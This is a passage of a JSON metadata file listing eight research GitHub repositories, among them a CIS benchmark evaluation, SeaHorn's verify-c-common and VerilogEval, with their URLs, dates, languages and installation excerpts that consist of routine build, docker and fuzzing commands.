                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 636026
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 102585
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 32342
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 6900
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 5369
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "366": {
        "filename": "tum-i22_CIS-Benchmark-Evaluation_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/tum-i4/CIS-Benchmark-Evaluation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. We have set up a clean VM with the tested OS.\nIf the tested software was not an OS, we installed the software on a Windows 10 instance.\n2. We installed the [CIS-CAT tool](https://www.cisecurity.org/cybersecurity-tools/cis-cat-pro/) on the VM.\n3. We executed the OVAL checks of the tested CIS benchmark with the CIS-CAT tool on the VM.\nThe results are stored as `before.html`, e.g., [for Windows 10](https://github.com/tum-i22/CIS-Benchmark-Evaluation/blob/master/cis_win_10_1806/before.html).\n4. Next, we executed the automatic remediation of the benchmark using our generated scripts.\n5. Finally, we reran the OVAL checks.\nThis time, the results are stored as `after.html`, e.g., [for Windows 10](https://github.com/tum-i22/CIS-Benchmark-Evaluation/blob/master/cis_win_10_1806/after.html). \n",
                    "original_header": "CIS Benchmark Evaluation"
                },
                "confidence": 0.9917080761200409,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/tum-i22/CIS-Benchmark-Evaluation/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-08-10T15:55:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-09-27T16:00:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 86443973
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "367": {
        "filename": "hiroto-takatoshi_XLM_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/hiroto-takatoshi/XLM",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "First, get the monolingual data (English Wikipedia, the [TBC corpus](https://yknzhu.wixsite.com/mbweb) is not hosted anymore).\n```\n# Download and tokenize Wikipedia data in 'data/wiki/en.{train,valid,test}'\n# Note: the tokenization includes lower-casing and accent-removal\n./get-data-wiki.sh en\n```\n\n[Install fastBPE](https://github.com/facebookresearch/XLM/tree/master/tools#fastbpe) and **learn BPE** vocabulary (with 30,000 codes here):\n```\nOUTPATH=data/processed/XLM_en/30k  # path where processed files will be stored\nFASTBPE=tools/fastBPE/fast  # path to the fastBPE tool\n\n# create output path\nmkdir -p $OUTPATH\n\n# learn bpe codes on the training set (or only use a subset of it)\n$FASTBPE learnbpe 30000 data/wiki/txt/en.train > $OUTPATH/codes\n```\n\nNow **apply BPE** tokenization to train/valid/test files:\n```\n$FASTBPE applybpe $OUTPATH/train.en data/wiki/txt/en.train $OUTPATH/codes &\n$FASTBPE applybpe $OUTPATH/valid.en data/wiki/txt/en.valid $OUTPATH/codes &\n$FASTBPE applybpe $OUTPATH/test.en data/wiki/txt/en.test $OUTPATH/codes &\n```\n\nand get the post-BPE vocabulary:\n```\ncat $OUTPATH/train.en | $FASTBPE getvocab - > $OUTPATH/vocab &\n```\n\n**Binarize the data** to limit the size of the data we load in memory:\n```\n# This will create three files: $OUTPATH/{train,valid,test}.en.pth\n# After that we're all set\npython preprocess.py $OUTPATH/vocab $OUTPATH/train.en &\npython preprocess.py $OUTPATH/vocab $OUTPATH/valid.en &\npython preprocess.py $OUTPATH/vocab $OUTPATH/test.en &\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "1. Preparing the data",
                    "parent_header": [
                        "XLM for defects",
                        "II. Cross-lingual language model pretraining (XLM)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/hiroto-takatoshi/XLM/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To [train with multiple GPUs](https://github.com/facebookresearch/XLM#how-can-i-run-experiments-on-multiple-gpus) use:\n```\nexport NGPU=8; python -m torch.distributed.launch --nproc_per_node=$NGPU train.py\n``` \n",
                    "original_header": "2. Train the BERT model"
                },
                "confidence": 0.9051377762873599,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hiroto-takatoshi/XLM/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "In addition to the **train.py** script, we provide a complementary script **glue-xnli.py** to fine-tune a model on either GLUE or XNLI. \n",
                    "original_header": "3. Fine-tune a pretrained model on GLUE tasks"
                },
                "confidence": 0.904853001435187,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hiroto-takatoshi/XLM/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Note that we provide a [tokenizer script](https://github.com/facebookresearch/XLM/blob/master/tools/tokenize.sh):\n```\nlg=en\ncat my_file.$lg | ./tools/tokenize.sh $lg > my_tokenized_file.$lg &\n```\n \nFor other language pairs, look at the [OPUS collection](http://opus.nlpl.eu/), and modify the get-data-para.sh script [here)(https://github.com/facebookresearch/XLM/blob/master/get-data-para.sh#L179-L180) to add your own language pair. \n",
                    "original_header": "Train your own XLM model with MLM or MLM+TLM"
                },
                "confidence": 0.9499418484589016,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hiroto-takatoshi/XLM/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This script will apply BPE using the XNLI15 bpe codes, and binarize data.\n```\n./prepare-xnli.sh\n```\n \n",
                    "original_header": "Preprocess data"
                },
                "confidence": 0.9754547279150575,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/hiroto-takatoshi/XLM/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-08-28T14:55:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2019-12-25T02:55:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 266122
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 40647
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 23423
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 5233
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "368": {
        "filename": "seahorn_verify-c-common_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/seahorn/verify-c-common",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The tool-specific builds for SeaHorn, KLEE and libFuzzer are containerized with docker for CI. You can also build these containers locally to replicate the verification results.\n",
                    "type": "Text_excerpt",
                    "original_header": "Experiment with docker",
                    "parent_header": [
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/seahorn/verify-c-common/master/README.md"
            },
            {
                "result": {
                    "value": "Dockerfile: [`docker/verify-c-common.Dockerfile`](docker/verify-c-common.Dockerfile).\n\nTo build and run all seahorn verification jobs:\n```\n$ docker build -t verify-c-common . --file docker/verify-c-common.Dockerfile\n$ docker run -t verify-c-common /bin/bash -c \"cd build && mkdir -p /tmp/verify-c-common && env VERIFY_FLAGS=\\\"<FLAGS>\\\" ctest -j<THREAD_NUM> --output-on-failure --timeout 2000\"\n```\nSet `<FLAGS>` to a space delimited string to specify flags for every verification job. For example set `<FLAGS>` to `--cex --horn-bmc-solver=smt-y2` will run every job under counter example mode and use [Yices 2](https://yices.csl.sri.com/) as the SMT solver instead of [z3](https://github.com/Z3Prover/z3). More details on verification options can be found in [a later section](#basic-verification-options). Set `<THREAD_NUM>` to a number suitable for your machine to run verification jobs in parallel.\n",
                    "type": "Text_excerpt",
                    "original_header": "SeaHorn",
                    "parent_header": [
                        "Installation",
                        "Experiment with docker"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/seahorn/verify-c-common/master/README.md"
            },
            {
                "result": {
                    "value": "Dockerfile: [`docker/verify-c-common-smack.Dockerfile`](docker/verify-c-common-smack.Dockerfile).\n\nTo build and run all SMACK jobs:\n```\n$ docker build -t verify-c-common:smack . --file docker/verify-c-common-smack.Dockerfile\n$ docker run -t verify-c-common:smack /bin/bash -c \"cd build && ctest -R smack_ --timeout 2000\"\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "SMACK",
                    "parent_header": [
                        "Installation",
                        "Experiment with docker"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/seahorn/verify-c-common/master/README.md"
            },
            {
                "result": {
                    "value": "Dockerfile: [`docker/verify-c-common-symbiotic.Dockerfile`](docker/verify-c-common-symbiotic.Dockerfile).\n\nTo build and run all Symbiotic jobs:\n```\n$ docker build -t verify-c-common:symbiotic . --file docker/verify-c-common-symbiotic.Dockerfile\n$ docker run -t verify-c-common:symbiotic /bin/bash -c \"cd build && ctest -R symbiotic_ --timeout 5000\"\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Symbiotic",
                    "parent_header": [
                        "Installation",
                        "Experiment with docker"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/seahorn/verify-c-common/master/README.md"
            },
            {
                "result": {
                    "value": "Dockerfile: [`docker/verify-c-common-klee.Dockerfile`](docker/verify-c-common-klee.Dockerfile).\n\nTo build and run all KLEE jobs:\n```\n$ docker build -t verify-c-common:klee . --file docker/verify-c-common-klee.Dockerfile\n$ docker run -t verify-c-common:klee /bin/bash -c \"cd build && ctest -R klee_ --timeout 2000\"\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "KLEE",
                    "parent_header": [
                        "Installation",
                        "Experiment with docker"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/seahorn/verify-c-common/master/README.md"
            },
            {
                "result": {
                    "value": "Dockerfile: [`docker/verify-c-common-fuzz.Dockerfile`](docker/verify-c-common-fuzz.Dockerfile).\n\nTo build and run all libFuzzer jobs:\n```\n$ docker build -t verify-c-common:fuzz . --file docker/verify-c-common-fuzz.Dockerfile\n$ docker run -t verify-c-common:fuzz /bin/bash -c \"cd build && ctest -R fuzz_ --timeout 2000\"\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "libFuzzer",
                    "parent_header": [
                        "Installation",
                        "Experiment with docker"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/seahorn/verify-c-common/master/README.md"
            },
            {
                "result": {
                    "value": "Dockerfile: [`docker/aws-c-common.Dockerfile`](docker/aws-c-common.Dockerfile).\n\nTo build and run all aws-c-common jobs by cbmc:\n```\n$ docker build -t aws-c-common:latest . --file docker/aws-c-common.Dockerfile\n$ docker run -t aws-c-common:latest /bin/bash -c \"cd scripts && python3 run_aws_res.py\"\n```\nNote that, it will copy a python script [`run_aws_res.py`](scripts/run_aws_res.py) under the `scripts` folder in the container.\n",
                    "type": "Text_excerpt",
                    "original_header": "aws-c-common",
                    "parent_header": [
                        "Installation",
                        "Experiment with docker"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/seahorn/verify-c-common/master/README.md"
            },
            {
                "result": {
                    "value": "This is a common step for all other configurations.\n\n1. Clone [aws-c-common](https://github.com/awslabs/aws-c-common) project in the root directory of the project so that a\n   sub-directory `aws-c-common` is created\n   ```bash\n   $ git clone https://github.com/awslabs/aws-c-common\n   ```\n\n2. Configure `aws-c-common` as instructed, make sure to compile with `clang-14` so that fuzzing can work. Configure using the following commands:\n   ```bash\n   $ cd aws-c-common\n   $ mkdir build\n   $ cd build\n   $ cmake \\\n   -DCMAKE_C_COMPILER=clang-14 \\\n   -DCMAKE_EXPORT_COMPILE_COMMANDS=1 \\\n   -DCMAKE_INSTALL_PREFIX=$(pwd)/run ../ -GNinja\n   ```\n\n3. Build `aws-c-common` library:\n   ```bash\n   $ cmake --build . --target install\n   ```\n   or\n   ```bash\n   $ ninja install\n   ```\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup AWS-C-COMMON",
                    "parent_header": [
                        "Installation",
                        "Build locally with CMake and Clang-14"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/seahorn/verify-c-common/master/README.md"
            },
            {
                "result": {
                    "value": "`--cex`: runs verification under counterexample(cex) mode. Cex mode changes configuration options\nto yield more readable results if the result is `SAT` (one of the assertions failed). A counterexample harness file will also be generated at `/tmp/h.ll`. You can link the harness file with unit proof bitcode file with `$SEA cex` to create an executable counterexample:\n`$SEA cex -m64 -g --only-strip-extern --keep-lib-fn --klee-internalize <BC_FILE_NAME> /tmp/h.ll -o debug`. Running in cex mode might negatively affect the verification\ntime, but could be very useful for debugging.\n\n`--vac`: runs verification under vacuity(vac) mode. Vac mode checks whether any of the assertions are *vacuously true*, in other words whether any assertions are not reachable. It is recommended to always run verification jobs under vac mode when a new job returns `UNSAT` to check whether it is a false positive.\n\n`--horn-bmc-solver=[smt-z3, smt-y2]`: chooses the smt-solver that will be used for BMC verification. Z3 is used by default; set this flag to `smt-y2` to choose Yices2 instead. Yices2 can sometimes yield a much shorter verification time under cex mode.\n",
                    "type": "Text_excerpt",
                    "original_header": "Basic verification options",
                    "parent_header": [
                        "Installation",
                        "Build verification jobs for SeaHorn using CMake"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/seahorn/verify-c-common/master/README.md"
            },
            {
                "result": {
                    "value": "We have adapted SMACK by using different configurations supported by the tool, including options for ineger / pointer encoding, options for property checks, and options for its memory model. The shown one is the configuration which SMACK performs best as we collected.\nAll verification results by giving different options we collected and reasoning on a jupyter [notebook](https://colab.research.google.com/drive/1tr37scaF4zOrgAYHUBCYi5mk1vwKhF1n?usp=sharing).\n",
                    "type": "Text_excerpt",
                    "original_header": "SMACK experiment with different options",
                    "parent_header": [
                        "Installation",
                        "Build and run verification jobs for SMACK"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/seahorn/verify-c-common/master/README.md"
            },
            {
                "result": {
                    "value": "We reasoned why Symbiotic can take less times on verifying `priority_queue` and `ring_buffer` categories where other tools may take longer. We tried to add some failed assertions like `sassert(false)` (aka. `__VERIFIER_assert(false)`) on the proofs such as `priority_queue_push`, `priority_queue_push_ref`, and `priority_queue_s_swap`. However, Symbiotic still report no error found on all those cases. The details can be found on issue [124](https://github.com/seahorn/verify-c-common/issues/124).\n",
                    "type": "Text_excerpt",
                    "original_header": "Issues we found",
                    "parent_header": [
                        "Installation",
                        "Build and run verification jobs for Symbiotic"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/seahorn/verify-c-common/master/README.md"
            },
            {
                "result": {
                    "value": "We need to rebuild `aws-c-common` with fuzzing and coverage cflags.\n\nReconfigure:\n```bash\n$ cd aws-common/build/\n$ cmake -DCMAKE_C_COMPILER=clang-14 \\\n  -DCMAKE_EXPORT_COMPILE_COMMANDS=1 \\\n  -DCMAKE_INSTALL_PREFIX=$(pwd)/run \\\n  -DCMAKE_C_FLAGS='-fsanitize=fuzzer-no-link,address,undefined -fprofile-instr-generate -fcoverage-mapping' \\\n  ../ -GNinja\n```\nRebuild:\n```bash\n$ cmake --build . --target install\n```\nor\n```bash\n$ ninja install\n```\nEnter the verification build directory and reconfigure CMake to enable fuzzing:\n```bash\n$ cmake \\\n   -DSEA_LINK=llvm-link-14 \\\n   -DCMAKE_C_COMPILER=clang-14 \\\n   -DCMAKE_CXX_COMPILER=clang++-14 \\\n   -DSEAHORN_ROOT=<SEAHORN_ROOT> \\\n   -DSEA_ENABLE_FUZZ=ON \\\n   -Daws-c-common_DIR=<AWS_C_COMMON_CMAKE_DIR> \\\n   ../ -GNinja\n```\nRebuild with:\n```bash\n$ cmake --build .\n```\nor\n```bash\n$ ninja\n```\n\nTo run all libFuzzer tests:\n```bash\n$ ctest -R fuzz_\n```\n\nThe fuzzing target executable for verification job `<NAME>` is installed as `build/seahorn/jobs/<NAME>/<NAME>_fuzz`. `build/seahorn/jobs/<NAME>/corpus/` will contain some corpus inputs generated by libFuzzer if any fuzzing runs are executed.\n```bash\n$ build/seahorn/jobs/<NAME>/<NAME>_fuzz -h\n```\nwill show you all the options for libFuzzer.\n\nTo fuzz individual targets, run \n```bash\n$ ASAN_OPTIONS=detect_leaks=0 build/seahorn/jobs/<NAME>/<NAME>_fuzz corpus -use_value_profile=1 -detect_leaks=0 -runs=<RUN_NUM> -allocator_may_return_null=1\n```\nThis command will fuzz the target for at most `<RUN_NUM>` times or until a crash has occurred. Memory leak detection is turned off to prevent spurious memory leak warnings.\n",
                    "type": "Text_excerpt",
                    "original_header": "Reconfigure and rebuild `aws-c-common`",
                    "parent_header": [
                        "Installation",
                        "Build and run verification jobs for libFuzzer"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/seahorn/verify-c-common/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "[data]: https://colab.research.google.com/github/seahorn/verify-c-common/blob/master/experiment_results.ipynb\n[fuzz]: https://seahorn.github.io/verify-c-common/fuzzing_coverage/index.html\n \n",
                    "original_header": "Results"
                },
                "confidence": 0.9929970817757644,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/seahorn/verify-c-common/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-05-20T09:30:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-23T20:14:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 531100
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 240324
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 160182
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 40484
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 11757
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 1688
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "369": {
        "filename": "lukasmoldon_GHStreaksThesis_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lukasmoldon/GHStreaksThesis",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-09-11T13:57:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-12-05T15:00:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 494154
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "370": {
        "filename": "make4all_notebooka11y_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/make4all/notebooka11y",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-02-19T20:31:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-15T15:44:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 2269479
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 63898
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 440
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "371": {
        "filename": "stg-tud_licma_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/stg-tud/licma",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. Clone this repository (git clone https://github.com/stg-tud/licma.git).\n2. Set the environment variable DATA in the file [.env](.env). This variable\ndefines the directory were the data is located that should by analysed.\nBy starting the docker container this diretory is linked to /usr/data of\nthe docker container licma.\n3. Start a terminal and change to the directory were the file [docker-compose.yml](docker-compose.yml)\nis located.\n4. Start the docker containers by entering: `$ docker-compose up`\n\nNow the docker containers licma and bblfsh are started. You can see them witch `$ docker ps -a`. \n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "LICMA(Language Independent Crypto-Misuse Analysis)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/stg-tud/licma/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "LICMA was used in the publication **Python Crypto Misuses in the Wild**. \nThis are the evaluation and scripts for out paper: **Python Crypto Misuses in the Wild** by\n<a itemprop=\"sameAs\" content=\"https://orcid.org/0000-0002-1441-2423\" href=\"https://orcid.org/0000-0002-1441-2423\" target=\"orcid.widget\" rel=\"me noopener noreferrer\" style=\"vertical-align:left;\">Anna-Katharina Wickert<img src=\"https://orcid.org/sites/default/files/images/orcid_16x16.png\" style=\"width:1em;margin-left:.5em;\" alt=\"ORCID iD icon\"></a>, <a itemprop=\"sameAs\" content=\"https://orcid.org/0000-0002-5805-2773\" href=\"https://orcid.org/0000-0002-5805-2773\" target=\"orcid.widget\" rel=\"me noopener noreferrer\" style=\"vertical-align:left;\">Lars Baumg\u00e4rtner<img src=\"https://orcid.org/sites/default/files/images/orcid_16x16.png\" style=\"width:1em;margin-left:.5em;\" alt=\"ORCID iD icon\"></a>, <a itemprop=\"sameAs\" content=\"https://orcid.org/0000-0003-2337-1819\" href=\"https://orcid.org/0000-0003-2337-1819\" target=\"orcid.widget\" rel=\"me noopener noreferrer\" style=\"vertical-align:left;\">Florian Breitfelder<img src=\"https://orcid.org/sites/default/files/images/orcid_16x16.png\" style=\"width:1em;margin-left:.5em;\" alt=\"ORCID iD icon\"></a>, and <a itemprop=\"sameAs\" content=\"https://orcid.org/0000-0001-6563-7537\" href=\"https://orcid.org/0000-0001-6563-7537\" target=\"orcid.widget\" rel=\"me noopener noreferrer\" style=\"vertical-align:left;\">Mira Mezini<img src=\"https://orcid.org/sites/default/files/images/orcid_16x16.png\" style=\"width:1em;margin-left:.5em;\" alt=\"ORCID iD icon\"></a>.\nTechnische Universit\u00e4t Darmstadt, D-64289 Darmstadt, Germany.\n \n",
                    "original_header": "Publication"
                },
                "confidence": 0.99877800521933,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/stg-tud/licma/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-08-26T12:16:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-12T02:13:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 956424
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 375444
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1928
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 128
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "372": {
        "filename": "NVlabs_verilog-eval_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/NVlabs/verilog-eval",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "In order to use PyHDL-Eval you will need to install iverilog, verilator,\nand python3 along with several Python packages. These are the versions\nwhich were used for this project:\n\n - iverilog (v12)\n - python3 (v3.11.0)\n\n**Please note that iverilog v13 (development release) is not supported.**\n\nTo install Python 3.11:\n```\n$ conda create -n codex python=3.11\n$ conda activate codex\n```\n\nInstall [ICARUS Verilog](https://github.com/steveicarus/iverilog):\n```\n$ git clone https://github.com/steveicarus/iverilog.git && cd iverilog \\\n        && git checkout v12-branch \\\n        && sh ./autoconf.sh && ./configure && make -j4\\\n        && make install\n```\n\nYou will also need the following Python packages:\n\n```\n % pip install langchain langchain-openai langchain-nvidia-ai-endpoints\n```\n\nWe plan to provide a Dockerfile and backwards compatibility mode with a prebuilt jsonl soon.\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup Linux Environment",
                    "parent_header": [
                        "VerilogEval Overview"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/NVlabs/verilog-eval/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-23T17:00:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-30T22:46:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "SystemVerilog",
                    "name": "SystemVerilog",
                    "type": "Programming_language",
                    "size": 1234549
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 38254
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "M4",
                    "name": "M4",
                    "type": "Programming_language",
                    "size": 7741
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 7728
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "373": {
        "filename": "ReMine-Lab_RRGen_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/armor-ai/RRGen",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-08-28T11:28:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-03T03:06:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 127136
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 5233
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
